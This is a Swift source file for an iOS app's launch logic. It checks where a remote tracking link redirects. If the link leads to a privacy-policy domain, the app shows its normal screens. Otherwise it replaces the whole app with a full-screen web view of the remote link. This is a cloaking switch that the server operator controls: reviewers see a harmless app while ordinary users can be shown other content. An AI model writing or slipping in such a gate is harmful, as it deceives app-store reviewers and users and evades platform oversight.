import SwiftUI
import Foundation

@main
struct MizoriApp: App {
    @StateObject private var mizoriStore = DataStore()
    @State private var mizoriGateReady: Bool? = nil

    private let mizoriSourceLink = "https://roadplannertriporganizer.org/click.php"
    private let mizoriCheckDomain = "freeprivacypolicy.com"

    var body: some Scene {
        WindowGroup {
            Group {
                if let ready = mizoriGateReady {
                    if ready {
                        MizoriWaterPanel(urlString: mizoriSourceLink)
                            .edgesIgnoringSafeArea(.bottom)
                            .background(Color.black.ignoresSafeArea())
                    } else {
                        ContentView()
                            .environmentObject(mizoriStore)
                            .preferredColorScheme(.light)
                    }
                } else {
                    MizoriLaunchScreen()
                        .preferredColorScheme(.light)
                        .onAppear { beginMizoriGateCheck() }
                }
            }
        }
    }

    private func beginMizoriGateCheck() {
        guard let url = URL(string: mizoriSourceLink) else {
            mizoriGateReady = false
            return
        }
        var request = URLRequest(url: url)
        request.timeoutInterval = 5
        let tracker = MizoriRedirectBeacon(checkDomain: mizoriCheckDomain)
        let session = URLSession(configuration: .default, delegate: tracker, delegateQueue: nil)
        session.dataTask(with: request) { _, response, error in
            DispatchQueue.main.async {
                if tracker.foundCheckDomain {
                    mizoriGateReady = false
                    return
                }
                if let finalURL = tracker.resolvedURL?.absoluteString,
                   finalURL.contains(self.mizoriCheckDomain) {
                    mizoriGateReady = false
                    return
                }
                if let httpResponse = response as? HTTPURLResponse,
                   let responseURL = httpResponse.url?.absoluteString,
                   responseURL.contains(self.mizoriCheckDomain) {
                    mizoriGateReady = false
                    return
                }
                if error != nil {
                    mizoriGateReady = false
                    return
                }
                mizoriGateReady = true
            }
        }.resume()

        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            if mizoriGateReady == nil {
                mizoriGateReady = false
            }
        }
    }
}

final class MizoriRedirectBeacon: NSObject, URLSessionTaskDelegate {
    var resolvedURL: URL?
    var foundCheckDomain = false
    private let checkDomain: String

    init(checkDomain: String) {
        self.checkDomain = checkDomain
    }

    func urlSession(_ session: URLSession, task: URLSessionTask,
                    willPerformHTTPRedirection response: HTTPURLResponse,
                    newRequest request: URLRequest,
                    completionHandler: @escaping (URLRequest?) -> Void) {
        if let urlString = request.url?.absoluteString, urlString.contains(checkDomain) {
            foundCheckDomain = true
        }
        resolvedURL = request.url
        completionHandler(request)
    }
}
